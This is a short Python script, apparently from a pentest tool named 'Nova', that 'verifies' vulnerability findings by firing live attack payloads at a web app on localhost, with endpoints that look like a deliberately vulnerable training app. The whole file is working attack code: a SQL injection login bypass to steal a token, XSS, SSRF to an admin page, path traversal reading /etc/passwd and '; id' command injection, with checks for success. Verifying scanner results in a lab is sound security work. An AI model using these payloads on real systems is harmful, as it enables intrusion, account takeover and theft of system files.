#!/usr/bin/env python3
import json, time, requests
from urllib.parse import urljoin, quote

class LiveVerificationEngine:
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url
        self.verified = []
        self.failed = []
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Nova/9.0"})
        self.templates = {
            "sql_injection": {"payloads": [("' OR 1=1--", ["user", "email", "token"])], "endpoints": ["/rest/products/search?q="]},
            "xss": {"payloads": [("<script>alert('NOVA')</script>", ["NOVA"])], "endpoints": ["/rest/products/search?q="]},
            "ssrf": {"payloads": [("http://127.0.0.1:3000/administration", ["admin"])], "endpoints": ["/rest/products/search?q="]},
            "auth_bypass": {"payloads": [({"email": "' OR 1=1--", "password": "x"}, ["token"])], "endpoints": ["/rest/user/login"], "method": "POST"},
            "path_traversal": {"payloads": [("../../../etc/passwd", ["root:"])], "endpoints": ["/file-serving?file="]},
            "command_injection": {"payloads": [("; id", ["uid="])], "endpoints": ["/api/execute?cmd="]},
        }
    
    def verify(self, finding):
        ftype = finding.get("type", "").lower()
        t = self.templates.get(ftype)
        if not t: return False
        for ep in t.get("endpoints", [])[:1]:
            for payload, indicators in t.get("payloads", [])[:1]:
                try:
                    if t.get("method") == "POST":
                        resp = self.session.post(urljoin(self.base_url, ep), json=payload if isinstance(payload, dict) else {"data": payload}, timeout=10)
                    else:
                        resp = self.session.get(f"{self.base_url}{ep}{quote(str(payload))}", timeout=10)
                    found = [i for i in indicators if i.lower() in resp.text.lower()]
                    if found:
                        self.verified.append({"type": ftype, "endpoint": ep, "status": resp.status_code, "indicators": found})
                        print(f"   💀 VERIFIED: {ftype} — {found}")
                        return True
                except: pass
        self.failed.append(finding)
        return False
    
    def run(self, findings):
        print(f"🔍 Testing {len(findings)} findings\n")
        for f in findings: self.verify(f)
        print(f"\n✅ Verified: {len(self.verified)} | ❌ Failed: {len(self.failed)}")
        for v in self.verified: print(f"   🔥 {v['type']}: HTTP {v['status']} — {v['indicators']}")

if __name__ == "__main__":
    findings = [{"type": "sql_injection"}, {"type": "xss"}, {"type": "ssrf"}, {"type": "auth_bypass"}, {"type": "path_traversal"}, {"type": "command_injection"}]
    print("🎯 NOVA LIVE VERIFY | localhost:3000\n")
    LiveVerificationEngine().run(findings)
